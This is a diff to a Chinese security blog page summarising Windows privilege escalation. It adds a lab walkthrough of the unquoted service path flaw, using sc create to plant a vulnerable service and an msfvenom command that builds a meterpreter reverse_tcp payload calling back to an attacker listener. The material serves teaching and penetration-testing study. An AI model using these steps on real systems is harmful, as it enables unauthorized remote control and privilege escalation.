@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Windows提权方式总结（未完成） - M0untainShley</title>
+  <title>Windows提权方式总结 - M0untainShley</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Windows提权方式总结（未完成）">
+            <span class="h2" id="subtitle" title="Windows提权方式总结">
               
             </span>
 
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2k 字
+      2.2k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      27
+      30
        分钟
     </span>
   
@@ -225,7 +225,7 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Windows提权方式总结（未完成）</h1>
+            <h1 style="display: none">Windows提权方式总结</h1>
             
               <p class="note note-info">
                 
@@ -348,9 +348,37 @@
 
 
 
+<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><h4 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
+<p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Windows在启动服务对应的二进制文件时，对于该路径中的每一个空格，Windwos都会尝试寻找并执行与空格前面的名字相匹配的程序，例如”C:\Program Files\Unicode.exe”，Windows会依次尝试确定和执行以下程序：</p>
+<ul>
+<li>C:\Program.exe</li>
+<li>C:\Program Files\Unicode.exe</li>
+</ul>
+<h4 id="可信任服务路径漏洞-1"><a href="#可信任服务路径漏洞-1" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>创建vulservice服务，对应的二进制执行文件路径为C:\Program Files\Unicode.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sc create vulservice binpath= <span class="hljs-string">&quot;C:\Program Files\Unicode.exe&quot;</span> displayname= <span class="hljs-string">&quot;vulservice&quot;</span><br></code></pre></td></tr></table></figure>
 
 
-<p>待更新…</p>
+
+<img src="/img/Windows提权方式总结/4.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>使用win+r，输入”services.msc”打开服务，可以看到刚才添加的服务</p>
+<img src="/img/Windows提权方式总结/5.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>msf构造恶意payload，启动监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.199.123  lport=4444 -f exe -o program.exe<br></code></pre></td></tr></table></figure>
+
+
+
+<p>启动该服务，msf上线</p>
+<img src="/img/Windows提权方式总结/5.gif" srcset="/img/loading.gif" lazyload>
+
+
+
 
             </div>
             <hr>
